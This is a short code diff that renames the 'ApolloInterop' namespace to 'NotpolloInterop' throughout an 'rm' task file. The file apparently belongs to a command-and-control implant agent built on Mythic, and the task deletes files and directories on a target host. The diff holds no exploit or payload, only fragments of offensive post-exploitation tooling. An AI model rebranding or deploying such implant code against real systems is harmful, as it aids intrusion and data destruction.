@@ -6,9 +6,9 @@
 
 #if RM
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Classes;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -38,7 +38,7 @@ namespace Tasks
             Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
         };
         
-        public rm(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public rm(IAgent agent, NotpolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
         }
 
@@ -75,7 +75,7 @@ namespace Tasks
             }
 
             
-            if (ApolloInterop.Utils.PathUtils.TryGetExactPath(path, out realPath))
+            if (NotpolloInterop.Utils.PathUtils.TryGetExactPath(path, out realPath))
             {
                 if (Directory.Exists(realPath))
                 {
